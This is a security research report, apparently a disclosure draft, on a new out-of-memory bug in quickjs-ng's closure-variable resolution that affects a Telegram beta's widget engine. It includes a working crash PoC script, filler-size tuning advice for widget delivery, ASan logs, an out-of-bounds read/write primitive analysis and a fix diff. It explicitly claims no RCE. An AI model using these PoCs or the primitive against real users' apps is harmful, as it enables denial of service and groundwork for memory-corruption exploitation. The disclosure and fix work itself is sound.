# New quickjs-ng closure-resolution OOM bug (`get_closure_var` -1 not checked)

Date: 2026-11-02. Host-only; no phone/emulator.
Targets:

| | commit | version |
|---|---|---|
| latest tag | `d7215b0ad3fc2c562e8317fd9bca058fd4863804` | 0.18.0 |
| app engine (Telegram 13.2.0 beta 72799) | `7a23d8e3fedb010070ef1a03873c55500c7aa1a9` | 0.17.0 |

Artifacts: `lab/qjs_new_rce/` (PoCs, logs, sweeps, forced-primitive build, fix diff).

## Verdict

**New, unreported memory-safety bug, not one of the excluded findings.**
`resolve_scope_var()` does not check the return value of `get_closure_var()`.
When `add_closure_var()`'s `js_resize_array()` fails under memory exhaustion,
`get_closure_var()` returns `-1`; the compiler then

1. reads `s->closure_var[-1]` (a `JSClosureVar` read immediately before the
   closure array, or address `-8` when the array is still NULL), and
2. emits `OP_get_var_ref` / `OP_put_var_ref` with closure index `0xffff`
   (`dbuf_put_u16(bc, -1)`).

At run time `var_refs[0xffff]` is read/dereferenced: the closure `var_refs`
array has only `JSFunctionBytecode.closure_var_count` entries, so this is an
out-of-bounds access **512 KiB past the array** (`0xffff * 8 = 0x7fff8`).
`OP_get_var_ref` then reads a JSValue through an attacker-influenced pointer;
`OP_put_var_ref` writes a JSValue to `var_refs[0xffff]->pvalue`.

What is demonstrated:

* **DoS (new):** plain widget JS under the 6 MiB heap model SIGSEGVs in
  `resolve_scope_var()`; reproduced with Scudo (Android allocator model) and
  with ASan+UBSan on both target commits. This is a new crash.
* **Memory corruption (new):** when the closure array already exists, the
  `closure_var[-1]` read lands in the 8-byte quickjs allocator block header
  in front of the array (mapped, no crash); the corruption that survives is
  the `0xffff` closure operand emitted into the bytecode. If the function is
  then created, `var_refs[65535]` is an OOB access 512 KiB past the array.
* **Runtime OOB primitive (new):** a diagnostic build that makes
  `get_closure_var()` return `-1` exactly as the OOM path does compiles the
  class successfully and dies in `JS_CallInternal` on `var_refs[65535]`
  (ASan `SEGV`, index register `0xffff`). The put path (`b = 7`) reaches the
  same access with an OOB write destination.
* **RCE: not demonstrated.** The index is fixed at `0xffff`, the target is a
  fixed +512 KiB offset, and the process has no address leak. A fake
  `JSVarRef` with an attacker-chosen `pvalue` would have to be placed at
  `var_refs + 0x7fff8`; the allocator distance and lack of an address leak
  block a concrete control-flow/ACL-bypass chain in this time box. This note
  explicitly does **not** claim RCE.

## 1. Root cause

In `quickjs.c` (`d7215b0`; line numbers differ by ~66 in `7a23d8e`), the
`resolve_scope_var()` paths that resolve parent/eval closure variables call
`get_closure_var()` and ignore the return value. `get_closure_var()` returns
`-1` when `add_closure_var()` fails, and `add_closure_var()` fails when
`js_resize_array(&s->closure_var, ..., closure_var_count + 1)` cannot allocate
(`add_closure_var` also returns `-1` on the 65536th variable, but the OOM path
is the interesting one).

The unchecked sites in `resolve_scope_var()` are:

```
34134  idx = get_closure_var(ctx, s, fd, JS_CLOSURE_LOCAL, idx, vd->var_name, ...);
       if (idx >= 0) { ... }            // checked (the only one)
34171  idx = get_closure_var(... fd->var_object_idx ...);
       dbuf_putc(bc, OP_get_var_ref);   // unchecked
34183  idx = get_closure_var(... fd->arg_var_object_idx ...);
       dbuf_putc(bc, OP_get_var_ref);   // unchecked
34205  idx = get_closure_var(... JS_CLOSURE_REF, idx1 ...);
       goto has_idx;                    // unchecked
34219  idx = get_closure_var(... JS_CLOSURE_REF, idx1 ...);
       dbuf_putc(bc, OP_get_var_ref);
       dbuf_put_u16(bc, idx);           // unchecked
34238  idx = get_closure_var(... JS_CLOSURE_REF, ...); // eval-closure loop
       dbuf_put_u16(bc, idx);           // unchecked
34243  idx = get_closure_var(... JS_CLOSURE_REF, ...);
       dbuf_put_u16(bc, idx);           // unchecked
```

At `has_idx` the code does:

```c
if ((op == OP_scope_put_var || op == OP_scope_make_ref) &&
    s->closure_var[idx].is_const) { ... }     // idx == -1
...
case OP_scope_get_var:
closure_scope_var:
    ...
    dbuf_put_u16(bc, idx);                    // -1 -> 0xffff
```

On the normal allocator `s->closure_var[-1]` is the 8-byte quickjs allocator
block header in front of the closure array (valid mapped memory). On the
allocator used by the ASan "large blocks" build and by the Scudo/Android
model, the closure array can still be NULL (the first `add_closure_var()` call
failed), so the read is `NULL - 8`, i.e. address `0xfffffffffffffff8`. This is
the crash that is directly reproducible.

## 2. Real trigger (plain JS, 6 MiB, no host APIs)

`poc/closure_oom_6181470.js`:

```js
var S="class C{static x=1}";
var filler="x".repeat(6181470);
eval(S);
```

`class` field initializers are compiled into a synthetic initializer function.
Resolving a reference inside it needs a closure variable, `add_closure_var()`
fails when the heap is nearly exhausted, and `resolve_scope_var()` reads
`s->closure_var[-1]`.

The filler value is build/allocator-specific; the window is narrow and can be
re-derived with `poc/sweep_closure_oom.py`. Measured windows:

| build | window (filler S) | result |
|---|---|---|
| `d7215b0` ASan+UBSan arena (`build/run_src`) | 6,181,463 … 6,181,502 (18 hits) | UBSan abort, rc 134 |
| `d7215b0` ASan-only arena (`run_src_asanonly`) | 6,191,031 … 6,191,070 (18 hits) | ASan SEGV, `rax = 0xfffffffffffffff8`, rc 134 |
| `7a23d8e` ASan+UBSan (`build/run_src_app`) | 6,181,479 … 6,181,518 (18 hits) | UBSan abort, rc 134 |
| `d7215b0` Scudo (`build/run_src_scudo`) | 6,181,463 … 6,181,502 (18 hits) | SIGSEGV (rc 139) |

The window is narrow because the compiler must consume almost all remaining
memory before the closure `js_realloc`; the exact S therefore depends on the
embedder's base heap use and allocator. The app evaluates inline `<script>`
elements sequentially in one 6 MiB context and continues after a script
exception (the 500 ms deadline is the only path that calls `die()`), so a
widget can ship a sequence of scripts with different filler sizes, release the
previous global filler (`filler = null`), and retry; the script cap is 1000.
That makes the unknown base/allocator offset tunable without a heap query.

The same script is used for all four; only the exact S value in the window
matters. The ASan-only build gives the cleanest evidence that the read is the
`NULL - 8` access (`logs/real_closure_asan_only.txt`):

```
AddressSanitizer:DEADLYSIGNAL
ERROR: AddressSanitizer: SEGV ... READ
  #0 resolve_scope_var quickjs.c:34322
  #1 resolve_variables ...
rax = 0xfffffffffffffff8
SUMMARY: AddressSanitizer: SEGV quickjs.c:34322:45 in resolve_scope_var
```

The ASan+UBSan build (d7215b0) reports:

```
quickjs.c:34322:25: runtime error: applying non-zero offset 18446744073709551608 to null pointer
    #0 resolve_scope_var quickjs.c:34322
    #1 resolve_variables quickjs.c:35266
    #2 js_create_function quickjs.c:37098
    #3 js_create_function quickjs.c:37078
    #4 __JS_EvalInternal quickjs.c:38306
```

The app commit report (`logs/real_closure_ubsan_app.txt`) is the same stack at
`src-app/quickjs.c:34256` / `35200` / `37032`.

Scudo (`logs/scudo_backtrace.txt`) gives a real SIGSEGV on the same read:

```
Program received signal SIGSEGV, Segmentation fault.
0x... in resolve_scope_var (...) at src/quickjs.c:34322
34322   if (s->closure_var[idx].is_lexical)
#0 resolve_scope_var
#1 resolve_variables
#2 js_create_function
#3 js_create_function
#4 __JS_EvalInternal
```

The app's runtime is a 6 MiB `JS_SetMemoryLimit` context
(`twidget_JSInterruptRuntime_ctor`, 0x776C30), and `eval`/`new Function` are
available to widget scripts, so this is a plain-script crash path. The exact
filler depends on the device runtime; the PoC is a crash candidate (`S` can be
tuned per build, as the four windows above show).

## 3. Runtime primitive (the reason this is more than a parser crash)

`dbuf_put_u16(bc, idx)` writes `0xffff` into the closure-variable operand.
`js_closure2()` allocates `p->u.func.var_refs` with
`b->closure_var_count` entries and initializes exactly those. The interpreter
then does:

```c
CASE(OP_get_var_ref):
    idx = get_u16(pc);            /* 0xffff */
    val = *var_refs[idx]->pvalue; /* 512 KiB past the array */
```

and, for a put:

```c
CASE(OP_put_var_ref):
    set_value(ctx, var_refs[idx]->pvalue, sp[-1]);
```

To prove the consequence independently of the allocator lottery, two
diagnostic quickjs builds were made:

* `poc/force_get_closure_var.diff` makes `get_closure_var()` return `-1` for
  the second cross-function `JS_CLOSURE_REF` entry - exactly the value the OOM
  path returns - and leaves the rest of the engine unchanged.
* `poc/force_runtime_oob.js` is `function T(){var a=1,b=2; return
  eval("class C{static x=a+b}")} T();`.

With that build:

```
==...==ERROR: AddressSanitizer: SEGV on unknown address 0x503000080c40
READ of size 8
    #0 JS_CallInternal quickjs.c:19033 (OP_get_var_ref_check)
...
Register rdx = 0x000000000000ffff
```

`logs/force_runtime_oob.txt`. The index register is `0xffff`; the engine read
`var_refs[65535]` and dereferenced it.

With `poc/force_runtime_put.js` (`static x=(b=7)`) and a second diagnostic
build that skips the bogus header flag check for `idx < 0`, the put path
reaches `JS_CallInternal:19024` (`set_value(ctx, var_refs[idx]->pvalue, ...)`)
and the ASan report is again a fault through the OOB slot (the read of
`var_refs[65535]` before the store).

### Exploitability assessment

The primitive is an OOB array indexing of `JSVarRef *` at a **fixed** distance
(`+0x7fff8`) from the closure `var_refs` array. If the 8 bytes at that address
are a fake `JSVarRef *` and the 8 bytes at fake+24 (`pvalue`) are a chosen
address, then `OP_put_var_ref 0xffff` writes a JSValue to that address: a
write-what-where with an attacker-chosen destination. Conversely
`OP_get_var_ref` reads a JSValue through `pvalue` and hands it to JS.

What is missing for an RCE claim:

1. The destination is not known to JS: there is no address leak in this
   primitive (it reads a JSValue, not a numeric address), so the attacker
   cannot point `pvalue` at a known native object without an independent
   infoleak.
2. The OOB slot is 512 KiB past a small allocation. Under the quickjs arena /
   Scudo, that lands in allocator metadata or another arena rather than in a
   buffer the attacker can fill; a fake `JSVarRef` at exactly that address
   would need a heap layout primitive this bug does not provide. Under the
   ASan large-block build the OOB slot happened to be a heap pointer that
   faulted on `->pvalue`; no controlled reclaim was obtained.
3. The index is fixed at 65535 by the `uint16_t` operand, so the offset cannot
   be made small (e.g. one past a 65535-entry array) without first creating a
   65535-entry closure list, which costs ~3 MiB of JSVarRefs and is not
   feasible under the 6 MiB cap together with the parser/compiler state.
4. Reaching the run-time step at 6 MiB is also blocked by the compiler's own
   allocation accounting. The closure array grows by ~8 bytes per successful
   entry and `js_create_function()` copies it into the bytecode allocation
   (another 8 bytes/entry). The parsed `OP_scope_get_var` bytecode that is
   freed at the end of `resolve_variables()` is only ~7 bytes/entry, so once
   enough entries exist to make the failed `js_realloc` delta large, the
   bytecode allocation needed afterwards is larger than the memory freed.
   With few successful entries (small enough for the bytecode allocation) the
   realloc delta is only 8 bytes and the parse-success headroom jump skips the
   window. The forced-primitive build bypasses exactly this accounting, which
   is why it can execute `OP_get_var_ref 0xffff` while the real OOM input
   aborts during compilation.

So: **new memory-corruption primitive, demonstrated OOB read of
`var_refs[65535]` and a demonstrated OOB write destination, but only DoS
proven end-to-end at the widget heap limit. No RCE is claimed.**

## 4. Dedup / novelty

Not in the tracker on 2026-11-02 (GitHub search: `resolve_scope_var`,
`get_closure_var`, `"too many closure variables"`, `closure variable OOM`: no
matching issue/PR). Not one of the excluded findings:

* not #1865 (that is `capture_var()` / `var_ref_count`, a different field and
  a different generator-frame path);
* not #1827 (RegExp bytecode lifetime), not #1853/#1518/#1394/#1379 (QBC
  loader), not N1 (`push_scope`), not FinalizationRegistry, not WeakMap #1835,
  not Array.find #1826, not #1843 (sort);
* not #1782: that is the parser reading a *truncated bytecode Dbuf* in
  `resolve_variables`; here the parser bytecode is valid and the failure is in
  `add_closure_var()`'s closure array. The two can coexist in the same OOM
  input, but the failing check and the emitted operand are different.

`git diff 7a23d8e..d7215b0 -- quickjs.c` does not touch `resolve_scope_var`,
`get_closure_var`, or `add_closure_var`; both target commits share the bug.

## 5. Fix

Check `idx < 0` at every `get_closure_var()` call in `resolve_scope_var()` and
abort compilation with the pending OOM (return -1; the callers propagate it).
`poc/fix_get_closure_var.diff` does this for the six unchecked sites; the
fixed build (`build/run_src_fixed2`) was replayed on all 40 filler values that
crash the unfixed build (6,181,463..6,181,502): every replay exits 0 with no
sanitizer report (`logs/fixed_no_crash.txt`). A defensive fix should also
make `add_closure_var()`/`get_closure_var()` failures non-ignorable, and
ideally use a distinct "no index" value instead of `-1` for `uint16_t`
operands.

## 6. Reproduction

```bash
cd /tmp/opencode/qjs_latest_fuzz
# latest tag, ASan+UBSan
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1 \
  ./build/run_src  <lab>/poc/closure_oom_6181470.js
# latest tag, ASan only (clean SEGV evidence)
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
  ./build/run_src_asanonly <lab>/poc/closure_oom_asanonly_6191031.js
# app commit 7a23d8e
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1 \
  ./build/run_src_app <lab>/poc/closure_oom_app_6181518.js
# Android allocator model
ASAN_OPTIONS=detect_leaks=0 ./build/run_src_scudo <lab>/poc/closure_oom_6181470.js
# forced-primitive build (diagnostic, not the real OOM path)
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
  ./build/run_force --setup <...>/cases2/force_setup.js \
                    --op <lab>/poc/force_runtime_oob.js --one 1000000
```

`poc/sweep_closure_oom.py <runner> <start> <end> <step> <outdir>` re-derives
the filler window on another allocator/build; `step 1` is needed because the
window is ~18 values wide.

## 7. Fuzzing / audit context

* `fuzz_oom` (two-phase: compile both scripts first, run setup, then execute
  the pre-compiled operation with `used + H` bytes of headroom, ASan/UBSan,
  2 workers) found only the known #1782 parser truncation in the first
  campaign (setup filled the heap, then the operation was compiled OOM);
  `fuzz_oom2` was stopped by libFuzzer's RSS limit with no new sanitizer
  finding.
* A 26-case deep OOM sweep (`run_sweeps.sh`) over JSON, RegExp, iterators,
  disposal, promises, Map/Set, change-array-by-copy, RAB/typed arrays,
  strings, BigInt, Proxy and object spread completed with **0 crashes**.
* A RegExp `v`-flag/lookbehind stress file (`poc/regexp_v_stress.js`) ran
  clean on both the arena and no-arena ASan builds.
* The closure-resolution bug was found by a targeted parser/compiler OOM
  sweep, not by the general fuzzer, because the failure must hit
  `add_closure_var()` specifically (a small `js_resize_array` in
  `resolve_variables`), while the parser bytecode itself is still valid.

## 8. Files

```
lab/qjs_new_rce/
  poc/closure_oom_6181470.js       d7215b0 crashing PoC (S=6181470)
  poc/closure_oom_asanonly_6191031.js  d7215b0 ASan-only PoC (S=6191031)
  poc/closure_oom_app_6181518.js   7a23d8e crashing PoC (S=6181518)
  poc/closure_oom.js               parameterized description
  poc/sweep_closure_oom.py         filler-window sweep
  poc/force_get_closure_var.diff   diagnostic -1-return patch
  poc/force_get_closure_var_put.diff  put-path variant (skips bogus flag read)
  poc/force_runtime_oob.js         forced runtime OOB (get)
  poc/force_runtime_put.js         forced runtime OOB (put)
  poc/fix_get_closure_var.diff     fix (checked get_closure_var returns)
  logs/real_closure_ubsan.txt      d7215b0 ASan/UBSan crash
  logs/real_closure_asan_only.txt  d7215b0 ASan-only SEGV (rax=-8)
  logs/real_closure_ubsan_app.txt  7a23d8e ASan/UBSan crash
  logs/scudo_backtrace.txt         Scudo SIGSEGV + backtrace
  logs/force_runtime_oob.txt       forced-primitive ASan SEGV (get)
  logs/force_runtime_put.txt       forced-primitive ASan SEGV (put)
  logs/sweep_v0180.txt             d7215b0 window
  logs/sweep_asanonly.txt          d7215b0 ASan-only window
  logs/sweep_app.txt               7a23d8e window
  logs/sweep_scudo.txt             Scudo window
  logs/fixed_no_crash.txt          40/40 fixed-build replays clean
  harness/, build_*/, cases2/      oom_sweep/fuzz_oom harnesses and cases
```
